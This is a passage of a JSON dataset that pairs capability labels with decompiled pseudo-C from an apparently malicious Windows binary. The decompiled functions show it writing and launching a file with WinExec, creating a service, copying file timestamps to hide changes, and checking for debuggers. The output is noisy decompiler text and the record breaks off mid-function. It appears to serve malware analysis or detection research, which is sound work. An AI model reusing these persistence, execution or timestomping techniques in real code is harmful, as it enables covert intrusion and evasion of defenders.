{
    "00401360": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004014a2) overlaps instruction at (ram,0x004014a0)\n// \n// WARNING: Removing unreachable block (ram,0x004014a2)\n// WARNING: Removing unreachable block (ram,0x004014a4)\n// WARNING: Removing unreachable block (ram,0x004014e5)\n// WARNING: Removing unreachable block (ram,0x004014a8)\n\nuint64_t __cdecl fcn.00401360(int16_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint extraout_EDX;\n    uint32_t uVar6;\n    uint *puVar7;\n    int32_t unaff_EDI;\n    uint *puVar8;\n    ushort in_SS;\n    bool in_ZF;\n    bool bVar9;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar10;\n    float10 in_ST0;\n    uint64_t uVar11;\n    ushort uVar12;\n    \n    bVar10 = false;\n    if ((!in_ZF) && (in_ZF)) {\n        uVar5 = (in_IF & 1) * 0x200;\n        bVar10 = (uVar5 & 0x400) != 0;\n        in_IF = ((uVar5 | (in_TF & 1) * 0x100) & 0x200) != 0;\n    }\n    if (*arg_8h != 0x5a4d) {\n        return ZEXT48(arg_8h) << 0x20;\n    }\n    piVar1 = *(arg_8h + 0x1e) + arg_8h;\n    if ((-1 < piVar1) && (-1 >= piVar1)) {\n        *(unaff_EDI + bVar10 * -8 + 0x1c) = in_ST0;\n    }\n    if (*piVar1 != 0x4550) {\n        return ZEXT48(arg_8h) << 0x20;\n    }\n    bVar9 = piVar1[0x16] != 0;\n    if (bVar9) {\n        return ZEXT48(arg_8h) << 0x20;\n    }\n    if ((!bVar9) || (uVar12 = 0,  bVar9)) {\n        uVar12 = piVar1 >> 0x10;\n    }\n    uVar5 = CONCAT22(uVar12, in_SS);\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return ZEXT48(arg_8h) << 0x20;\n    }\n    uVar4 = *(arg_8h + 0x1e);\n    if (uVar4 < 0xc0) {\n        uVar5 = uVar4 - 0x80;\n    }\n    else if (uVar4 < 0xc0) {\n        out(0xbd, uVar4);\n        return CONCAT44(arg_8h, uVar4);\n    }\n    uVar11 = func_0x004050c6(uVar5);\n    puVar2 = uVar11;\n    bVar9 = puVar2 == NULL;\n    if (!bVar9) {\n        if ((!bVar9) && (bVar9)) {\n            bVar10 = ((bVar10 * 0x400 | (in_IF & 1) * 0x200) & 0x400) != 0;\n        }\n        uVar4 = 0;\n        if (uVar5 != 0) {\n            do {\n                iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n                uVar6 = uVar4 + 1;\n                *(uVar4 + puVar2) = iVar3 % 0xff;\n                uVar4 = uVar6;\n            } while (uVar6 < uVar5);\n        }\n        puVar7 = puVar2;\n        puVar8 = arg_8h + 0x40;\n        for (uVar4 = uVar5 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar8 = *puVar7;\n            puVar7 = puVar7 + bVar10 * -2 + 1;\n            puVar8 = puVar8 + bVar10 * -2 + 1;\n        }\n        uVar5 = uVar5 & 3;\n        bVar9 = uVar5 != 0;\n        for (; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar8 = *puVar7;\n            puVar7 = puVar7 + bVar10 * -2 + 1;\n            puVar8 = puVar8 + bVar10 * -2 + 1;\n        }\n        if ((bVar9) && (!bVar9)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        func_0x004050c0(puVar2);\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return uVar11 & 0xffffffff00000000;\n}\n",
        "token_count": 1182
    },
    "00401e50": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f35) overlaps instruction at (ram,0x00401f34)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * __cdecl fcn.00401e50(uint8_t *arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    char cVar3;\n    uint8_t in_AL;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint32_t extraout_ECX;\n    uint32_t uVar7;\n    uint8_t *unaff_EBX;\n    uint16_t uVar8;\n    uint8_t *unaff_EDI;\n    bool in_CF;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint16_t uVar9;\n    uint8_t uVar10;\n    uchar uVar11;\n    uchar in_stack_ffffffe4;\n    uchar in_stack_ffffffe5;\n    uchar in_stack_ffffffe6;\n    uchar in_stack_ffffffe7;\n    ushort in_stack_ffffffe8;\n    ushort in_stack_ffffffea;\n    uint8_t *arg_10h_00;\n    \n    if ((in_CF) || (arg_10h_00 = CONCAT22(in_stack_ffffffea, in_stack_ffffffe8),  !in_CF)) {\n        in_AL = arg_ch + 1U >> 1;\n        in_stack_ffffffe4 = 0;\n        in_stack_ffffffe5 = 0;\n        in_stack_ffffffe6 = 0;\n        in_stack_ffffffe7 = 0;\n        unaff_EBX = arg_8h;\n        arg_10h_00 = arg_8h;\n    }\n    cVar3 = in_AL - *unaff_EDI;\n    uVar9 = (in_NT & 1) * 0x4000 | SBORROW1(in_AL, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n            (cVar3 < '\\0') * 0x80 | (cVar3 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar3) & 1U) == 0) * 4 |\n            in_AL < *unaff_EDI;\n    uVar10 = (in_ID & 1) * 0x200000 >> 0x10 | (in_VIP & 1) * 0x100000 >> 0x10 | (in_VIF & 1) * 0x80000 >> 0x10 |\n             (in_AC & 1) * 0x40000 >> 0x10;\n    uVar11 = 0;\n    iVar4 = func_0x10187de0();\n    *(iVar4 + -0x2f) = *(iVar4 + -0x2f) | iVar4;\n    func_0x00aa71cb();\n    uVar5 = fcn.00402090(CONCAT13(uVar11, CONCAT12(uVar10, uVar9)), \n                         CONCAT13(in_stack_ffffffe7, \n                                  CONCAT12(in_stack_ffffffe6, CONCAT11(in_stack_ffffffe5, in_stack_ffffffe4))), \n                         arg_10h_00);\n    uVar5 = uVar5 & 0xffff;\n    puVar6 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar2 = puVar6[0x16];\n    if (uVar5 < uVar2) {\n        uVar5 = (uVar5 - uVar2 & 0xffff) - 1;\n        uVar7 = extraout_ECX;\n    }\n    else {\n        uVar7 = uVar2 & 0xffff;\n        uVar5 = uVar5 - uVar7;\n    }\n    uVar9 = uVar2 >> 0x10;\n    uVar8 = uVar5;\n    if (uVar8 < uVar9) {\n        if ((uVar8 == uVar9) || (uVar8 != uVar9)) {\n            uVar5 = uVar5 - (uVar2 >> 0x10);\n        }\n        else {\n            uVar1 = in(uVar2);\n            *puVar6 = uVar1;\n            if (&stack0xffffffe8 < 1) {\n                iVar4 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)();\n                if (iVar4 == 0) {\n                    return NULL;\n                }\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar4);\n                return 0x1;\n            }\n            *unaff_EBX = *unaff_EBX ^ uVar7 >> 8;\n            LOCK();\n            puVar6 = puVar6 + 1;\n        }\n        iVar4 = (uVar5 & 0xffff) - 1;\n    }\n    else {\n        iVar4 = uVar5 - (uVar2 >> 0x10);\n    }\n    *arg_14h = iVar4 + arg_ch;\n    *arg_10h = puVar6[0x16];\n    return puVar6;\n}\n",
        "token_count": 1231
    },
    "00402d40": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402d80) overlaps instruction at (ram,0x00402d7e)\n// \n// WARNING: Removing unreachable block (ram,0x00402e24)\n\nvoid __fastcall fcn.00402d40(char param_1)\n\n{\n    uint in_EAX;\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    char extraout_CL;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    char cVar6;\n    char extraout_DH;\n    ushort extraout_DX;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    int32_t *piVar5;\n    char *unaff_EBX;\n    int32_t unaff_EBP;\n    uchar *unaff_ESI;\n    uchar *puVar7;\n    uint *unaff_EDI;\n    uchar uVar8;\n    bool bVar9;\n    bool bVar10;\n    char cVar11;\n    bool bVar12;\n    unkbyte10 extraout_ST0;\n    uint64_t uVar13;\n    ulong uVar14;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uVar8 = false;\n    bVar9 = (CONCAT11((in_EAX >> 8) - param_1, in_EAX + '\\x01') - 1U & 0x637b) == 0;\n    uStack20 = 0x411274;\n    uStack24 = 0x11;\n    uStack28 = 0x4236f4;\n    uStack32 = 0x402d70;\n    uVar13 = fcn.00401bf0();\n    uVar3 = extraout_ECX;\n    if (uVar8 || bVar9) goto code_r0x00402d80;\n    while( true ) {\n        if (uVar8 || bVar9) {\n            cVar6 = *unaff_EBX;\n            puVar1 = unaff_EDI + 0x6a;\n            puVar7 = *puVar1;\n            *puVar1 = *puVar1 - &stack0xffffffe4;\n            piVar5 = uVar13 + -0xc;\n            *piVar5 = *piVar5 + unaff_EBP + (puVar7 < &stack0xffffffe4);\n            out((uVar13 >> 0x20) + 1, uVar13 + ((uVar3 >> 8) - cVar6));\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\ncode_r0x00402d80:\n        uStack32 = 0xf;\n        uStack36 = 0x411490;\n        uStack40 = 0x11;\n        puStack44 = 0x4236f4;\n        uVar14 = fcn.00401bf0();\n        puVar1 = uVar14;\n        if ((uVar8) || (!uVar8)) break;\n        uVar2 = puVar1 + 1;\n        if (&stack0xffffffd4 < *puVar1 || uVar2 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(puVar1 + -0xb) = *(puVar1 + -0xb) + unaff_EBP + (&stack0xffffffd4 < *puVar1);\n        iVar4 = (uVar14 >> 0x20) + 1;\n        cVar6 = iVar4 >> 8;\n        uVar8 = cVar6 != -1;\n        cVar6 = cVar6 + '\\x01';\n        uVar13 = CONCAT24(CONCAT11(cVar6, iVar4), uVar2 & 0xffffff00 | uVar2 + (extraout_ECX_00 >> 8));\n        bVar9 = cVar6 == '\\0';\n        uVar3 = extraout_ECX_00;\n    }\n    fcn.00401bf0(0x4236f4, 0x11, 0x4114a0, 0x1a);\n    cVar11 = '\\0';\n    cVar6 = unaff_EDI < 0;\n    uStack20 = 0x4114f4;\n    uStack24 = 0x11;\n    uStack28 = 0x4236f4;\n    uStack32 = 0x402e02;\n    uVar3 = fcn.00401bf0();\n    if ((cVar11 == cVar6) && (cVar11 != cVar6)) {\n        out(0xc4, uVar3);\n        *unaff_EDI = uVar3;\n    }\n    uStack32 = 0xb;\n    uStack36 = 0x411500;\n    uStack40 = 0x11;\n    puStack44 = 0x4236f4;\n    fcn.00401bf0();\n    uStack20 = 0x41150c;\n    uStack24 = 0x11;\n    uStack28 = 0x4236f4;\n    uStack32 = 0x402e60;\n    fcn.00401bf0();\n    bVar9 = extraout_DH == extraout_CL;\n    uStack20 = 0x411514;\n    uStack24 = 0x11;\n    uStack28 = 0x4236f4;\n    uStack32 = 0x402e81;\n    fcn.00401bf0();\n    puVar7 = unaff_ESI;\n    if ((!bVar9) && (bVar9)) {\n        puVar7 = unaff_ESI + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    uStack32 = 9;\n    uStack36 = 0x411520;\n    uStack40 = 0x11;\n    puStack44 = 0x4236f4;\n    fcn.00401bf0();\n    bVar9 = false;\n    uStack20 = 0x41152c;\n    uStack24 = 0x11;\n    uStack28 = 0x4236f4;\n    uStack32 = 0x402eeb;\n    fcn.00401bf0();\n    if ((!bVar9) && (bVar9)) {\n        unaff_EBX = unaff_EBX + *(unaff_EBX + extraout_EDX * 4 + 0x69) + bVar9;\n    }\n    uStack32 = 0xc;\n    uStack36 = 0x411538;\n    uStack40 = 0x11;\n    puStack44 = 0x4236f4;\n    uVar14 = fcn.00401bf0();\n    piVar5 = uVar14 >> 0x20;\n    *(uVar14 + -0x7ce92414) = extraout_ST0;\n    *piVar5 = *piVar5 + 0x36adf84;\n    fcn.00401bf0(0x4236f4, 0x11, 0x411544, unaff_EBX);\n    bVar9 = false;\n    bVar12 = false;\n    bVar10 = (((unaff_EBX ^ puVar7) >> 8) - 1U & 0xd) == 0;\n    uStack20 = 10;\n    uStack24 = 0x411548;\n    uStack28 = 0x11;\n    uStack32 = 0x4236f4;\n    uStack36 = 0x402f64;\n    fcn.00401bf0();\n    if ((!bVar9 && !bVar10) && (bVar9 || bVar10)) {\n        if (!bVar12) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uStack36 = 0x40;\n    uStack40 = 0x411554;\n    puStack44 = 0x11;\n    fcn.00401bf0(0x4236f4);\n    uStack20 = 0xc;\n    uStack24 = 0x411594;\n    uStack28 = 0x11;\n    uStack32 = 0x4236f4;\n    uStack36 = 0x402fb7;\n    puStack44 = puVar7;\n    fcn.00401bf0();\n    bVar9 = false;\n    uStack20 = 0xb;\n    uStack24 = 0x4115a0;\n    uStack28 = 0x11;\n    uStack32 = 0x4236f4;\n    uStack36 = 0x402fda;\n    fcn.00401bf0();\n    if ((!bVar9) && (bVar9)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uStack36 = 4;\n    uStack40 = 0x4115ac;\n    puStack44 = 0x11;\n    fcn.00401bf0(0x4236f4);\n    uStack20 = 4;\n    uStack24 = 0x4115b0;\n    uStack28 = 0x11;\n    uStack32 = 0x4236f4;\n    uStack36 = 0x403026;\n    fcn.00401bf0();\n    uStack20 = 0xc;\n    uStack24 = 0x4115b4;\n    uStack28 = 0x11;\n    uStack32 = 0x4236f4;\n    uStack36 = 0x403059;\n    fcn.00401bf0();\n    uStack20 = 4;\n    uStack24 = 0x4115c0;\n    uStack28 = 0x11;\n    uStack32 = 0x4236f4;\n    uStack36 = 0x40307a;\n    fcn.00401bf0();\n    uStack20 = 9;\n    uStack24 = 0x4115c4;\n    uStack28 = 0x11;\n    uStack32 = 0x4236f4;\n    uStack36 = 0x4030a5;\n    fcn.00401bf0();\n    uStack20 = 0x16;\n    uStack24 = 0x4115d0;\n    uStack28 = 0x11;\n    uStack32 = 0x4236f4;\n    uStack36 = 0x4030dd;\n    fcn.00401bf0();\n    uStack20 = 7;\n    uStack24 = 0x4115e8;\n    uStack28 = 0x11;\n    uStack32 = 0x4236f4;\n    uStack36 = 0x403102;\n    fcn.00401bf0();\n    return;\n}\n",
        "token_count": 2465
    },
    "00402540": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00402540(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x423728 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00404da0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x411548, acStack1304, &uStack2112);\n    uStack2088 = 0x4115d0;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4115e8;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401b60(auStack1564, 0x411544, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1867
    },
    "00404900": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004049a1) overlaps instruction at (ram,0x0040499e)\n// \n// WARNING: Removing unreachable block (ram,0x00404995)\n\nuint __cdecl fcn.00404900(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint *puVar8;\n    char lpBuffer;\n    uint var_22fh;\n    uint var_12ch;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t hFile;\n    \n    lpBuffer = '\\0';\n    var_12ch._0_1_ = 0;\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &var_12ch + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    hFile = arg_ch;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar6 = &lpBuffer;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar6 = 0x4112ac;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    puVar5 = &var_12ch;\n    do {\n        puVar8 = puVar5;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        puVar8 = puVar5 + 1;\n        cVar1 = *puVar5;\n        puVar5 = puVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = puVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    if ((arg_ch == -1) && (hFile = fcn.00401c70(arg_8h),  hFile == -1)) {\n        return 0;\n    }\n    iVar2 = hFile;\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(hFile, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1182
    },
    "00401510": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401510(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00403670();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401210();\n        arg_ch_01 = fcn.00401210();\n        arg_ch_02 = fcn.00401210();\n        fcn.00404da0(arg_10h, arg_ch_00);\n        fcn.00404da0(arg_8h, arg_ch_01);\n        fcn.00404da0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x411288, &lpBuffer, arg_10h);\n        iVar2 = fcn.00401670(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x411294, &lpBuffer, arg_8h);\n            iVar2 = fcn.00401670(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x411294, &lpBuffer, arg_ch);\n                iVar2 = fcn.00401670(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00404da0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 609
    },
    "00401670": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004016ae) overlaps instruction at (ram,0x004016ac)\n// \n\nuint __cdecl fcn.00401670(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    bool in_PF;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((!in_PF) && (in_PF)) {\n        puVar5 = &stack0xfffffff8;\n        cVar1 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    iVar3 = (*_sym.imp.MSVCRT.dll__access)(arg_8h);\n    if ((iVar3 != -1) && ((iVar3 < -1 || (-2 < iVar3)))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 267
    },
    "00401750": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401894) overlaps instruction at (ram,0x00401893)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00401750(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    int32_t iVar3;\n    uchar extraout_DL;\n    uint8_t *unaff_EBX;\n    uint *puVar4;\n    bool bVar5;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.004036d0();\n    if (iVar1 == 0) {\n        return false;\n    }\n    fcn.00401160();\n    iVar1 = fcn.00404a60(0x4112d8);\n    if (iVar1 != -1) {\n        return false;\n    }\n    fcn.00402d40();\n    *0x423728 = 1;\n    iVar1 = fcn.004034e0();\n    if (iVar1 != 0) {\n        return false;\n    }\n    if ((iVar1 < 0) || (iVar3 = extraout_ECX,  var_80h._0_1_ = extraout_DL,  iVar1 >= 0)) {\n        var_80h._0_1_ = 0;\n        iVar3 = 7;\n    }\n    *unaff_EBX = *unaff_EBX & 